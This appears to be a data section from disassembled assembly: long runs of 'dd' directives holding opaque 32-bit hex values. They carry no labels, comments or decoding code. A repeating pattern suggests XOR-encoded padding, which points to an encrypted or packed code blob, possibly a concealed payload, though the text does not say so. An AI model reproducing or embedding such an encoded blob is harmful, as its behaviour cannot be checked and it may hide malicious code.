		dd 1CFFE92Eh, 832576A5h, 59F3EC1Ch, 0B1F94B64h,	129B3485h
		dd 0FD80EF95h, 0BEFD6AEFh, 61BBE8FFh, 0B98BFFFCh, 0A37618CBh
		dd 6B66F124h, 0A2C1ECF1h, 64F54366h, 4A474C5h, 3983B4A0h
		dd 0EFF9C2E7h, 907F6D90h, 6D907F6Dh, 0BCF5EC6Ch, 0E8367655h
		dd 2FF10E9h, 0FBD94C64h, 0A9C353Bh, 0A6C0DCA0h,	2DF5C46Ch
		dd 4C66FD04h, 0B9C7E7D9h, 0EFFD0CCBh, 6C30FD00h, 1183E7D9h
		dd 7F0DCE7h, 0DDFFFC64h, 0E8FFCBE1h, 0FFFC623Fh, 0E8E73983h
		dd 0FD01CB79h, 2476E864h, 0E8E518C1h, 2FF1141h,	0E58EE8D4h
		dd 5B2FCE5Dh, 3F082B7Eh, 0B8AB00EBh, 87F96Ah, 0A800EFEDh
		dd 0FA020085h, 10EE9CD8h, 368B1776h, 0F3D97C66h, 0FF1162E8h
		dd 0F9736402h, 63CC864h, 8B4A0E02h, 7D008735h, 0E7E00EFh
		dd 0F3EF9703h, 0F94B6459h, 0F7D94466h, 54FA0251h, 7610EE9Ch
		dd 64E124ABh, 89FFD954h, 2D03EBBEh, 0E39689B0h,	89B1388Bh
		dd 0A65DE7AEh, 2DF5C46Ch, 907FFD04h, 6D907F6Dh,	7F6D907Fh
		dd 571E7656h, 0AA109170h, 8EB11510h, 4664ED01h,	0F90087F9h
		dd 217600EFh, 0E8E7BB89h, 2FF10EDh, 0BFE8FFB8h,	5FFFFC61h
		dd 6D902CA3h, 7F6D907Fh, 8BEBBC8Bh, 0FE04CBB1h,	0EFF9C22Eh
		dd 907F6D90h, 0C7681097h, 8BED01BDh, 0EFFDA1h, 7464BFFDh
		dd 0EFFD00CAh, 98037C00h, 0AB00EFFCh, 9B74F164h, 4E62F924h
		dd 12607F9h, 0A170FF10h, 246B3A2Ch, 0FD00EE59h,	0EFFD00EFh
		dd 0FF13EEE8h, 0A94E6202h
		dd 4BD98429h, 1EFFD01h,	2FCEC15h, 93B38D10h, 0A4CB79C6h
		dd 0FF00EFFCh, 1006F307h, 24AB70FFh, 0D0628F1h,	0BFED018Bh
		dd 0EDFF68h, 3D1510FDh,	85ED018Bh, 6AEF9700h, 20085FCh
		dd 0EE9C6CFAh, 0AC697410h, 4D00EFFDh, 0CBB988AEh, 24AB3B04h
		dd 0B9C6DEF8h, 29BE06CBh, 45E8D944h, 0F924BB76h, 0EF4D8E62h
		dd 8629FD00h, 0FD00EF48h, 477BC7EFh, 0FFEFFD00h, 74FF1002h
		dd 0EBBC88FEh, 9CCB718Bh, 7600EFFCh, 66995E29h,	0EFFD0Dh
		dd 59C46EFDh, 2CFD00EEh, 907F6D90h, 6D907F6Dh, 7F6D907Fh
		dd 0E81E7656h, 0FD00EFE5h, 0E7D94419h, 56E68901h, 0FC222E15h
		dd 0EB3983EFh, 0C2B13B8Bh, 6D90EFF9h, 9395FF85h, 64FFFC52h
		dd 0FD00EF5Ch, 669950EFh, 0EFFD25h, 7656BEFDh, 9B74571Eh
		dd 628F524h, 0ED018B0Dh, 0EF598664h, 0FF85FD00h, 0D94428ADh
		dd 0EFFD03F3h, 0B5693B00h, 0FD00EFFDh, 8E3D1510h, 0BE6CED01h
		dd 0FD00EF55h, 64FA7410h, 88115CEh, 738BEFFDh, 0EFFD004Bh
		dd 610FC08Bh, 251FFFCh,	436B8B38h, 52EFFD00h, 0E8FF3802h
		dd 0FFFC6457h, 0C693B38Dh, 0FF14CBB9h, 10062307h, 54A170FFh
		dd 0E924AB3Bh, 14EBE8EEh, 4E6202FFh, 0D94429D1h, 0E61500FBh
		dd 8D1002FBh, 0B9C7EBB3h, 100214CBh, 0F90702FFh, 76FF1007h
		dd 0B0F124A3h, 0D66995Eh, 0FD00EFFDh, 2CEDC46Ch, 907F6D90h
		dd 6D907F6Dh, 4557AB57h, 6418ABAAh, 0F8BE3D9h, 12CC9DCh
		dd 2E9B3C8Bh, 818BB8AEh, 6E9B10CBh, 75EEFDF9h, 77C9DCFFh
		dd 3E7638F3h, 0FF101F81h, 0E98AEFFDh, 0EE1ABCBAh, 4135CF10h
		dd 0BD38F375h, 358FC6D4h, 0C2B1A65Fh, 6D90EFF5h, 7F6D907Fh
		dd 907F6D90h, 0AE20037Eh, 64AA56BAh, 74D15F1h, 7B8BEFFDh
		dd 0EFFD0043h, 48FA0250h, 3B10EE9Ch, 0EFFDB569h, 0AC4EFD00h
		dd 7810EE1Fh, 6CEB742Fh, 119BF9F8h, 8905177Eh, 0B2A35FE3h
		dd 83B43D32h, 0F5C2CF39h, 85FB6AEFh, 0FFED9701h, 0FC644BE8h
		dd 100583FFh, 477B89h, 0F175EFFDh, 0DDA05EB0h, 0C46CA6C0h
		dd 0FD082DDDh, 0EE1FAC4Eh, 24B37610h, 89C06AC9h, 0D4D68E8h
		dd 104ED01h, 551510AEh,	64ED018Bh, 751078F8h, 0A05EB0F1h
		dd 6CA6C0DDh, 82DDDC4h,	1FAC4EFDh, 837610EEh, 0C06AC524h
		dd 0D944289Bh, 9BFD02CFh, 0D649B0Ah, 0ED013E41h, 0BAFCEBBEh
		dd 6443E8FFh, 7466FFFCh, 64DF24ABh, 1085F157h, 0A98DED76h
		dd 64AF24CBh, 0A8697608h, 0AD00EFFDh, 0DFD94C66h, 645FE8FFh
		dd 583FFFCh, 0B0F17510h, 0C0DDA05Eh, 0DDC46CA6h, 6CFD082Dh
		dd 10D513Dh, 0EA75EAEDh, 217653BAh, 0EF5EE8h, 88C06BFDh
		dd 0B2A35FE5h, 202B7E5Bh, 7600E73Fh, 0EFFDA879h, 24A37000h
		dd 0AC0185EEh, 10950885h, 52EFFDFFh, 0DA24AB3Bh, 5BE8FFEEh
		dd 85FFFC64h, 0AD3C9A3Dh, 0EF559664h, 8DBFFD00h, 0AD1BCBB9h
		dd 0EF970085h, 28CBB18Dh, 9551E397h, 77FD00EBh,	24AB3A52h
		dd 0FD00EEC5h, 0CBB9C7EFh, 250DD3Ch, 0D94428FDh, 0EFC798AFh
		dd 0BCFA0200h, 9710EE99h, 85FD6AEEh, 8087AB00h,	9710EFCFh
		dd 29FD6AEFh, 0EF4886h,	54E8EEFDh, 6CFD0048h, 8666E1C4h
		dd 0FD00EF59h, 0B1A2015Fh, 0C46CA65Dh, 0FD082DDDh, 7F6D907Fh
		dd 4971181h, 0AB53EFFDh, 85AAF164h, 24AB7000h, 558E64EDh
		dd 85FD00EFh, 50ED4E04h, 0D94428ACh, 0EFFD03CFh, 24AB3A00h
		dd 0FD00EFD9h, 0CBB9C6EFh, 5C67F81Ch, 0B9C6F2D9h, 67FD1ECBh
		dd 0FFF0D95Ch, 0FC647FE8h, 0EF6BB9FFh, 0C0DCFD00h, 0D1245370h
		dd 64FD00EDh, 0EF5596h,	70AB1CFDh, 62ED24ABh, 50CBD94Ch
		dd 0FD6AEF97h, 66FD6ABEh, 0C7D3D954h, 0FC38CBB9h, 10FD00EFh
		dd 18B6915h, 82C06AEDh,	476B8BF4h, 52EFFD00h, 9998FA02h
		dd 0B1A210EEh, 81B43D32h, 0FD049739h, 0EFF5C2EFh, 47738Bh
		dd 0FD6AEFFDh, 0DFD98462h, 68EFFD02h, 0FD00EDA5h, 0FA0251BFh
		dd 10EE999Ch, 0D124537Dh, 0EAFD00EDh, 2CC780Fh,	798AEFFDh
		dd 0EFFF2DCBh, 742F7900h, 0F2C3D5F7h, 0EFFF106Ah, 3AE71600h
		dd 0EF85E03Eh, 50FD00EEh, 10EE1EB0h, 0CEFF267Eh, 1853F22Fh
		dd 84E0B4D1h, 0FD00EF00h, 0EE1EB050h, 0FF267E10h, 2CF7410Fh
		dd 0B4DBFA6h, 0D964ED01h, 0FFF267Eh, 0A62CF741h, 0B9067655h
		dd 0FD00EFBDh, 0C3D9BC62h, 8DEFFD01h, 0FC2ECB69h, 440E00EFh
		dd 3D645666h, 0ED018EB9h, 0EE1EB087h, 8429AF10h, 0FD01DBD9h
		dd 737505EFh, 0EEC824h,	70D710FDh, 0EED21C6Bh, 0B087FD00h
		dd 0AD10EE19h, 0D9E1AC66h, 0FFEFFD01h, 5586642Ah, 62FD00EFh
		dd 6AECD64Ch, 0D99462FDh, 0EFFD01DFh, 0FFBFAF51h, 0FC647FE8h
		dd 0CBA98DFFh, 0B92FCE14h, 0FD00EF6Bh, 0DFD9BC62h, 52EFFD02h
		dd 76AB1CADh, 0EFFDA861h, 4462AD00h, 0B189DBD9h, 85AD38CBh
		dd 24AB3A00h, 0FD00EEC1h, 7BE8FFEFh, 85FFFC64h,	730FB23Dh
		dd 0EFFD01C2h, 477B8Bh,	0FD6AEFFDh, 0DFD99462h,	68EFFD02h
		dd 0FD00EDA5h, 0FA0250BDh, 10EE999Ch, 0D124537Dh, 0EAFD00EDh
		dd 1EC780Fh, 798AEFFDh,	0EFFF2DCBh, 0F2F7900h, 0FD001B78h
		dd 0CB698BEFh, 0EFF988h, 551510AFh, 6AED018Bh, 0EB6BF2C0h
		dd 3B00EFFDh, 0EAE524ABh, 19CBB9C6h, 0D94429FCh, 0AB3B00F5h
		dd 8BEEE624h, 0F58BE3BDh, 63D98464h, 50EFFD04h,	0A989FE76h
		dd 0FA0220CBh, 10EE99A0h, 0FDA87976h, 0EF9700EFh, 1CCBB18Dh
		dd 0AF51E597h, 0CBB98989h, 90FA0230h, 4410EE99h, 0EFFD0079h
		dd 0BC623D33h, 0FD02C3D9h, 0CBA98DEFh, 8B440E24h, 0FD00477Bh
		dd 0CBB18DEFh, 85AC10h,	9752EF97h, 0CBB989EFh, 24AB3A3Ch
		dd 0FD00EEC5h, 7BE8FFEFh, 85FFFC64h, 761B903Dh,	0EFFDA869h
		dd 1510AD00h, 0ED018B65h, 2FCF5EB0h, 782B7C5Bh,	3F00EFF9h
		dd 797600E7h, 0EFFDA8h,	718DEF97h, 0EFFF30CBh, 2B79500h
		dd 0AF51EFFDh, 8B611510h, 0BC6FED01h, 0FD02C3D9h, 508805EFh
		dd 2DCB798Ah, 7900EFFFh, 0B049752Fh, 5BEE4D5Eh,	0F9782B7Ch
		dd 0E73F00EFh, 0A8617600h, 0AC00EFFDh, 8B651510h, 5EB0ED01h
		dd 7C5B2FCFh, 0EFF9782Bh, 0E73F00h, 6D907F6Dh, 7F6D907Fh
		dd 907F6D90h, 0FD22E745h, 0F34BE8EFh, 8BBCFD01h, 0DF10CB61h
		dd 0B9A800EFh, 477E8Bh,	7657EFFDh, 0CBB98924h, 24AB3A14h
		dd 0FD00EEEDh, 0EF3FE8EFh, 0C06BFD00h, 0FD946BF2h, 0C27600EFh
		dd 10EE999Ch, 0FD00AE44h, 0CB898DEFh, 24537010h, 0FD00EEE9h
		dd 4A0E0085h, 8C62FD6Ah, 0FD01F3D9h, 0BEFD6AEFh, 1510FD6Ah
		dd 0ED018B69h, 9B02F86Ch, 7E2F785Ah, 0F50056C6h, 2FCE00EFh
		dd 18CB418Dh, 0AD00EFFFh, 6C76AB1Ch, 0EFFDA8h, 0E1247B70h
		dd 87FD00EDh, 0EFDD00h,	28FFBFAFh, 0C483C06Ah, 18CB718Dh
		dd 0AD00EFFFh, 7368BBEh, 0EFFD58h, 0BCE82476h, 6BFD00EFh
		dd 5F6688C0h, 3583B2A3h, 2B7C5B10h, 0EFDF08h, 7600EB3Fh
		dd 0EDCBE824h, 5EB0FD00h, 2C86CA0h, 0E73981B4h,	0C2EFFD22h
		dd 6D90EFF9h, 7F6D907Fh, 437C8Bh, 26AEFFDh, 2FE8FFBFh
		dd 0C3FFFC61h, 0FDB56E77h, 7F3E00EFh, 907F6D90h, 6D907F6Dh
		dd 85118BBAh, 527F95FFh, 5C64FFFCh, 0EFFD00EFh,	25669950h
		dd 0FD00EFFDh, 64D9EC6Ch, 56BCF145h, 74F164AAh,	2F78F08Ah
		dd 0C7038889h, 0FD0013B8h, 0F78800EFh, 0EE3AE8h, 94D64FDh
		dd 66995EB0h, 0EFFD0Dh,	188BB4FDh, 0EFF5C2B2h, 8AA7650h
		dd 0AD04A170h, 1009B707h, 4B170FFh, 10E82476h, 6C02FF1Ah
		dd 0D199F0F8h, 368BEF97h, 100ABF07h, 81E776FFh,	0FD005F3Bh
		dd 3FB089EFh, 0B9EBAD8Ah
		dd 0FD00EFF8h, 0DC2D7D62h, 0D4BA75C0h, 0E874490Eh, 871D4D62h
		dd 10EE6160h, 1D4528ACh, 0FFFCD11Fh, 1F484E8h, 97F6DCFDh
		dd 66368BEAh, 7D07F175h, 76FF100Ah, 663B3BEFh, 84E0F145h
		dd 2FF1084h, 6615CB64h,	3B1002F5h, 7F0FE3B8h, 1002FF86h
		dd 6A3FA88Dh, 368BBDF8h, 7F57566h, 0FF1009B0h, 970CAA70h
		dd 247650EBh, 0FF1B5EE8h, 0F54D6202h, 64AC0485h, 0F47915CBh
		dd 0A88B1002h, 1C8F8DE3h, 1A051556h, 3983EFFCh,	64058BEBh
		dd 0E8BFF545h, 0FD01F521h, 66F9C46Ch, 0FF6A1545h, 0FDA66BF2h
		dd 2F7800EFh, 71790Fh, 0AA56EFFDh, 0B215CB64h, 8B1002F4h
		dd 0A08BE7B0h, 0BB08903h, 0CB64AA56h, 2F85415h,	7B88B10h
		dd 0E4BA7056h, 1550BDAAh, 0EFFDB363h, 85FF3983h, 70589A3Dh
		dd 21762C9Ch, 0FF1966E8h, 194D6402h, 0BE155564h, 0E8217652h
		dd 2FF1C61h, 3A15CE64h,	6A1002F4h, 76CE64FDh, 1957E837h
		dd 4D6402FFh, 7650BC11h, 0EFFDB866h, 0FFFE7600h, 1557EBAFh
		dd 0EFFC1AB5h, 8307B88Bh, 1550EB39h, 0EFFC1AA1h, 8303888Bh
		dd 5BE9EB39h, 6202FF11h, 6087214Dh, 0AC10EE61h,	1F214528h
		dd 0E8FFFCD1h, 0FD01F5ABh, 87255562h, 10EE6160h, 254528AFh
		dd 0FFFCD10Fh, 1F5BCE8h, 117564FDh, 7F94E62h, 0FF100B18h
		dd 0FD6AEF97h, 6215CE64h, 0B8EFFD00h, 0ED00DC44h, 7F6D902Ch
		dd 907F6D90h, 0C8BB9ACh, 0EBD94462h, 8E64F96Ah,	0FD00EF55h
		dd 0EF7D68BFh, 0FF87FD00h, 0AC00EF02h, 0CBB9C789h, 66EFFC18h
		dd 0E724AB3Ah, 0FA0200EFh, 10EE99B4h, 0FDA87976h, 10AF00EFh
		dd 18EC115h, 488662EDh,	85FD00EFh, 1510AD00h, 0ED018EBDh
		dd 0EF558E64h, 0FFBEFD00h, 0FC6477E8h, 436B8BFFh, 52EFFD00h
		dd 9C64FA02h, 693A10EEh, 0EFFDA8h, 2FF1002h, 7F3E59B1h
		dd 907F6D90h, 6D907F6Dh, 7F6D907Fh, 53FF1183h, 0ABE964A8h
		dd 0CB9189B8h, 54B27014h, 94E82476h, 6402FF1Ah,	85C7D944h
		dd 0EB86E03Dh, 66FD00EEh, 0C7F7D944h, 0FD1CCBB9h, 30FD00EFh
		dd 0DCF7D96Ch, 0FC65EFF0h, 17F8DCFFh, 0E8FFFC64h, 0FD01F6C5h
		dd 0CBB989BFh, 19CD1514h, 58BEFFCh, 6AF9C46Ch, 5FE588FFh
		dd 7E5BB2A3h, 0E73F102Bh, 24AB7600h, 0D97464D5h, 0A37050CBh
		dd 51B9E924h, 4E4A07AAh, 2B7E00EFh, 742F7810h, 0EE8B8EBh
		dd 6CFD01F7h, 0C86CF9C4h, 0A05EB002h, 0FF3983B4h, 8BEFF5C2h
		dd 7610CBA9h, 7AA5222h,	0FF100BE0h, 0ED24AB76h,	0EF4DC56Eh
		dd 0C06CFD00h, 0A80585F0h, 0AB74CB64h, 0D507DD24h, 70FF100Ch
		dd 85E524A3h, 0CB64AC04h, 2F12815h, 0CBA98D10h,	52EB9728h
		dd 44E82476h, 6402FF1Eh, 8BFFD944h, 1557BF36h, 1002F143h
		dd 18631557h, 0B18BEFFCh, 7AC2CCBh, 0EEE57Ch, 0CD24A376h
		dd 3E76E864h, 0E92E008Bh, 76A51CFFh, 64E124ABh,	30E7ECAh
		dd 0E082B7Eh, 938D8D4Bh, 6507338Bh, 76FF1009h, 0BED524A3h
		dd 0E8217655h, 2FF1E95h, 0E689ED6Ah, 18AB1555h,	3983EFFCh
		dd 0CB918BEBh, 20EF9514h, 368BEFFDh, 100F8B07h,	85ADFFh
		dd 9CE82476h, 0BF02FF1Bh, 1907308Bh, 0A200EFFDh, 6CA65DB1h
		dd 82DEDC4h, 6D907FFDh,	7F6D907Fh, 907F6D90h, 6D907F6Dh
		dd 0CBA18BBCh, 8BB9A80Ch, 0AA18CB89h, 0FBD97C64h, 0E964233Bh
		dd 0E924AB3Ah, 0EFFD00EFh, 4428B172h, 0FD00F3D9h, 6A7600EFh
		dd 0EFFDA8h, 0AA56EF97h, 7FE8FFBFh, 85FFFC64h, 760E903Dh
		dd 0AEE124A3h, 89E00483h, 811CCBB1h, 0CB818332h, 509BF21Ch
		dd 0E924A376h, 27FE0A85h, 4C660303h, 0E8FFF7D9h, 0FFFC6113h
		dd 0DED4232Bh, 26855B8Eh, 19CE2691h, 47708Bh, 0FD6AEFFDh
		dd 10AC57BCh, 18B6D15h,	82C06AEDh, 117E46E9h, 830A810Fh
		dd 0ED74E003h, 0FBD944EEh, 14CBB98Bh, 0E524A376h, 0EC89C1D4h
		dd 5F103583h, 3F5BB2A3h, 7F6D00E3h, 907F6D90h, 0F924AB76h
		dd 0EF458166h, 42DFD00h, 6D907FFDh, 0AF4457B9h,	33EFFD00h
		dd 1FB0503Dh, 0DA7610EEh, 10EE9C44h, 0BDB9440Eh, 50FD00EFh
		dd 10EE1EB0h, 0BDB9440Eh, 50FD00EFh, 10EE19B0h,	0B98B440Eh
		dd 435E0CCBh, 8BFFFCE2h, 7810CBB9h, 0BFF5742Fh,	10D4D68h
		dd 76D610EDh, 55E924A3h, 10EE1EB0h, 0F0893D78h,	0FFFCD153h
		dd 4464F574h, 0AF50F7D9h, 5F44D610h, 85FFFCE4h,	76089B34h
		dd 0BDE124BBh, 5F390251h, 0FD142DA3h, 7F6D907Fh, 907F6D90h
		dd 3AF164ABh, 0EE9808E9h, 4A93A10h, 0FD00EFFDh,	0EF5D9B07h
		dd 89217600h, 4CE8FBBBh, 62FD00EFh, 4666BD0Ch, 0F5E12EEDh
		dd 7ACC8ECh, 0EEEB90h, 7410B976h, 0D3C1CA9h, 8107AF02h
		dd 7E00EEEBh, 2176082Bh, 0C7F7BB89h, 0FD00E7BBh, 0A93A00EFh
		dd 0EFFD0Ch, 0F8A607FDh, 297600EFh, 907F3E5Eh, 15F164ABh
		dd 0EFFD00F7h, 8CBB9F6h, 0AB099BFCh, 0EEEB5107h, 42B7E00h
		dd 3F5E2976h, 7F6D00EBh, 571E7656h, 0BB8B10CEh,	0E7FBC7FFh
		dd 85FFFC65h, 7618913Dh, 0E37618A9h, 742678B8h,	971164FBh
		dd 64EFFFEEh, 3BA8ED46h, 76E89305h, 7AD1CA9h, 0EEEB12h
		dd 7E14A976h, 2F78042Bh, 89AA35Fh, 2E8EF97h, 0B6FD01FAh
		dd 907F6DC3h, 6D907F6Dh, 0EDDDEC6Eh, 55BCFD00h,	0B98DB8ABh
		dd 0EA9520CBh, 8BEFFD01h, 0B9C7BF0Ch, 0EFFD18CBh, 1510FD00h
		dd 0ED018EC9h, 0EE2F7887h, 24A37010h, 0AC5C85D9h, 8D391510h
		dd 0C46CED01h, 250AFF5h, 0EE9C44FAh, 14B97610h,	9C88DA76h
		dd 0AB7010EEh, 50BDDD24h, 0B18D3902h, 0DB9520CBh, 51FFFCD2h
		dd 0FD6A3902h, 0C3D99462h, 6AEFFD01h, 0FD6ABDDEh, 8CC91510h
		dd 8462ED01h, 0FD01C7D9h, 3DF968EFh, 8DBFED01h,	0FC30CB71h
		dd 139500EFh, 51FFFCD1h, 9E4CFA02h, 0BB7010EEh,	8462CD24h
		dd 0FD01D7D9h, 0FFFD68EFh, 5466FD00h, 0B989C3D9h, 0AE1530CBh
		dd 83EFFC15h, 258BFB39h, 0F7D96C62h, 14CBB9C7h,	0FD00EFFFh
		dd 0EFF90056h, 8B2FCE00h, 76AB1C06h, 87AC00A2h,	0EFED00h
		dd 0C51510AEh, 65ED018Eh, 841C7603h, 76199B3Dh,	0B9ED24BBh
		dd 24BB7442h, 451510E9h, 62ED018Eh, 80EEFB74h, 1A75EFC3h
		dd 0FBD94464h, 48EB3883h, 0E924AB74h, 7AEB69Ah,	0EEE9E6h
		dd 0E924AB76h, 0B0F9C46Ch, 81B4A05Eh, 0FD02CF39h, 7F6DC3EFh
		dd 907F6D90h, 6D907F6Dh, 7F6D907Fh, 2FF1181h, 0FDB8EFFDh
		dd 66FD00EEh, 89EBD944h, 7608CBB9h, 2F7814AEh, 0C46EFA75h
		dd 0FD00EDEDh, 0CBB18D2Ch, 24BB700Ch, 718DBEF5h, 0EFFC14CBh
		dd 8DBEAF00h, 7010CBA9h, 0BDE124A3h, 85AD51h, 9D38FA02h
		dd 2F7810EEh, 0C46EFA75h, 0FD00EDEDh, 0CBA98D2Ch, 1510AF10h
		dd 0ED018FC9h, 0E888C06Ah, 2FF3981h, 0ABC3EFFDh, 0EE2FA887h
		dd 30FA0210h, 7610EE9Ch, 3D6D681Fh, 0FFB9ED01h,	0FC619FE8h
		dd 9B3D85FFh, 24A3700Ch, 0D95462F9h, 10AF51FBh,	1510ABD0h
		dd 0ED018E89h, 0EBD94464h, 102B7C5Eh, 3E00EFFFh, 7F6D907Fh
		dd 907F6D90h, 6D907F6Dh, 57E08BBCh, 56FFFC61h, 0D97C64AAh
		dd 3C0257FFh, 14CB898Bh, 74660F2Ch, 0ED3D83E9h,	2A97466h
		dd 0FDFF10D8h, 0FA0250EFh, 10EE9FFCh, 398326CEh, 0A17666EBh
		dd 4A97402h, 257BFACh, 85AA503Ch, 0FFEF9700h, 0FC617BE8h
		dd 0B4A35FFFh, 90EFF5C2h, 0CE28037Eh, 1E76562Fh, 0E94457h
		dd 818DEFFDh, 440E18CBh, 8CBB98Dh, 0E524A370h, 0BEF96ABFh
		dd 3D07FD6Ah, 7800EF51h, 0B0F7742Fh, 83B13D33h,	0F9C2C739h
		dd 0CBB98BEFh, 24BB7034h, 7650BDEDh, 1097E821h,	446402FFh
		dd 0B18DE7D9h, 0BB700CCBh
		dd 52BEED24h, 510407ADh, 2F7800EFh, 33B0F774h, 3983B13Dh
		dd 0EFF9C2C7h, 8CBB18Bh, 56E607ACh, 0A37600EFh,	0F7B0F124h
		dd 0A3C0F425h, 2EDED018h, 0C2C73983h, 6D90EFF9h, 7F6D907Fh
		dd 907F6D90h, 0F80C037Ch, 0BAAE00EFh, 245B7656h, 0FD00EADDh
		dd 0BCAADBDCh, 8C64148Bh, 0FD05CBD9h, 6B7053EFh, 0EED924h
		dd 2E66EFDh, 87FD0010h,	0EFF900h, 0AE51B9ADh, 0CBA188BCh
		dd 2CFA023Ch, 2C10EE9Ch, 113B8301h, 0D2DC0233h,	0E3B2FCEh
		dd 0FBD97C66h, 18CB8989h, 0FC2461F2h, 637700EFh, 0EEE13Ch
		dd 0F2CBD5FDh, 0EFFDFC6Ah, 0CA64BF00h, 5D84E0B4h, 6CFD00EFh
		dd 659BF8E9h, 3285E0B4h, 67FD00EFh, 8BF3F95Ch, 818DE7B8h
		dd 0E3701CCBh, 80E3C40h, 0B88B27FEh, 0EE498DF3h, 0EFFC00h
		dd 0CEFF267Eh, 0CB89892Fh, 0F7410F10h, 76F9C42Ch, 640A8B2Eh
		dd 0C1FFD97Ch, 58F3ED14h, 0E7EC864h, 8B4B0E03h,	0F18DE7B8h
		dd 0E71CC1AFh, 45643503h, 0FC9C67E1h, 0EFFD03EFh, 40E7B88Bh
		dd 1608AA74h, 0EBA1889Eh, 8AA761Ch, 0E1249370h,	2EBD0C62h
		dd 0C8ECF5E1h, 701CAA76h, 0EDFD015Bh, 0C96CFD00h, 74C0DC02h
		dd 1DED249Bh, 2B3E0AAEh, 76F76404h, 64ED2493h, 88C016C1h
		dd 761CEBA1h, 0A27608AAh, 2493701Ch, 0BD3462E1h, 0ECF5E62Eh
		dd 32FCEF0h, 2C96C0Ch, 3E0AAE1Dh, 7466042Bh, 0A8BFFD9h
		dd 0FFD97C64h, 0E92E3C8Bh, 76A51CFFh, 0EC1C8327h, 746459F3h
		dd 0BDB9F7D9h, 0DCFD00EFh, 249370C0h, 76AB1CE1h, 4E92493h
		dd 4A37505h, 783AFE1h, 0DCFF75E6h, 0FED4BAD2h, 0E9249374h
		dd 11218CE0h, 5EB002FFh, 3981B4A0h, 0EFFD05E3h,	90EFF5C2h
		dd 6D907F6Dh, 0EECDEC6Eh, 8BBCFD00h, 250D6424h,	0B9ED013Dh
		dd 0CCBB189h, 190D649Bh, 0B8ED013Dh, 24A37466h,	0FD0656E1h
		dd 574300EFh, 8DFFFCD2h, 5C20CB81h, 0FFFCD23Bh,	156458F3h
		dd 0ED013D21h, 0E3D94466h, 13D1DA1h, 0D95466EDh, 9E88AFBh
		dd 8BFFFCD2h, 74A58936h, 67E524ABh, 0A4F1D954h,	2FC9015h
		dd 0AB705010h, 4C62ED24h, 0AC50AFD9h, 8CB11510h, 0C46CED01h
		dd 0D95462F1h, 0BD368BD3h, 0FF12A2E8h, 78F06402h, 89E57419h
		dd 4E64FB8Bh, 7651BFF9h, 1227E824h, 566402FFh, 56E8BDF9h
		dd 62FD0046h, 8BCFD944h, 0C8E8BF36h, 6402FF12h,	741978F0h
		dd 0F38B89E5h, 0BEF95664h, 0E8247652h, 2FF124Dh, 0BFF94664h
		dd 467CE8h, 0A65EB0FDh,	0EECDC46Eh, 902CFD00h, 6D907F6Dh
		dd 7F6D907Fh, 907F6D90h, 0FAC0037Ch, 0BAAE00EFh, 8462AA56h
		dd 0FD002FD9h, 0EEF868EFh, 0F164FD00h, 0C91510ADh, 87ED018Eh
		dd 10EE2F78h, 39246370h, 85FD00EFh, 1510AC5Ch, 0ED018D39h
		dd 0AFF5C46Ch, 44FA0250h, 7610EE9Ch, 0D27614B9h, 10EE9C88h
		dd 3D246B70h, 0BDFD00EFh, 8D380250h, 0FDC0CB71h, 0DB9500EFh
		dd 51FFFCD2h, 0FD6A3802h, 23D99462h, 6AEFFD02h,	0FD6ABDDEh
		dd 8CC91510h, 8462ED01h, 0FD0227D9h, 3DF968EFh,	8DBFED01h
		dd 0FFD0CB71h, 139500EFh, 51FFFCD1h, 9E4CFA02h,	2B7E10EEh
		dd 24A37010h, 0D99462D1h, 0EFFD002Fh, 0C8CB798Dh, 0AC00EFFFh
		dd 0C7D95466h, 2CCBB989h, 0CD24AB3Ah, 0EFFD007Bh, 611FE8FFh
		dd 0B98BFFFCh, 0ED423CCBh, 3BEFFD00h, 7E0E9A3Ah, 0EACD2493h
		dd 0CE64FA72h, 2FEAC15h, 0FFFD6810h, 0D907FD00h, 7600EEF2h
		dd 0CBA98D07h, 42B7E28h, 0DD248374h, 0FFD95466h, 18CB8189h
		dd 0FD04EF44h, 643D33EFh, 8B440EFDh, 7610CBB9h,	0EF9550EFh
		dd 55EFFD10h, 0D524AB74h, 8EC51510h, 7D6FED01h,	790FEFFDh
		dd 0EFFD0145h, 0E8217655h, 0FD00E9BDh, 0FBD94466h, 0EFBDB9h
		dd 70C0DCFDh, 0EE352453h, 0AB1CFD00h, 0FD00AF44h, 0CB418DEFh
		dd 0EFF9D0h, 0BDB9440Eh, 62FD00EFh, 53FD9BCh, 56F3EFFDh
		dd 0EFFD4056h, 24537000h, 0FD00EC2Dh, 0AF44AB1Ch, 8DEFFD00h
		dd 0FBD0CB41h, 440E00EFh, 1CCBB18Bh, 35247B70h,	0BEFD00EEh
		dd 0EEFD68h, 9550BDFDh,	0FFFCD213h, 24FA0255h, 7810EE9Ch
		dd 64827E2Fh, 0DBDCED46h, 8B7E2F78h, 0B976FFDCh, 328761Ch
		dd 0D98C623Fh, 0EFFD0127h, 1510AC50h, 0ED018ED5h, 0FF89C06Ah
		dd 43FFBB8Bh, 0FE01287Ch, 37C600EFh, 4A04257Ch,	701CB976h
		dd 83C5BD3h, 8B14FE08h,	0FC61ABE0h, 0CB718DFFh,	0EFF9D0h
		dd 0FD176B70h, 0BFFD00EDh, 8B3C0251h, 718DF3ABh, 0EFF8D0CBh
		dd 176B7000h, 0FD00EEFDh, 3C0251BFh, 0C6F3AB8Bh, 0FE00F879h
		dd 64FC00EFh, 89AFF546h, 818BE7BBh, 0F2761CCBh,	10EE9C24h
		dd 0D98462AAh, 0EFFD033Bh, 0EEFD68h, 0FD6ABFFDh, 0EE2FF087h
		dd 0D310A810h, 0D98C62AAh, 0EFFD063Bh, 0EEFD68h, 0FD6ABEFDh
		dd 0EE2FE887h, 0D310A810h, 2D247B70h, 64FD00E9h, 907AFCEh
		dd 7600EFF8h, 0CB798D17h, 0EFF9D0h, 15CE64ADh, 0EFFD0417h
		dd 0D0CB718Dh, 0AA00EFFEh, 3BD99462h, 8BEFFD05h, 0D9446425h
		dd 0BCAF51F7h, 0D8CB718Dh, 0AD00EFFCh, 7338BBEh, 0EFFD70h
		dd 0E924BB76h, 0E1E1E8BDh, 0E8BCFD01h, 0FD01E1EBh, 0E1EDE8B8h
		dd 0C46CFD01h, 0E8FFBAF1h, 0FFFC6157h, 1C7918Dh, 0FD00927Dh
		dd 11A785E0h, 6C6402FFh, 0B18BCFD9h, 0AB7610CBh, 0C16CE524h
		dd 0B189A7F9h, 0AB7410CBh, 85E0E524h, 2FF11EDh,	0E229E8BAh
		dd 0C46CFD01h, 0A2015FF9h, 6EA65DB1h, 0E83DC4h,	6D902CFDh
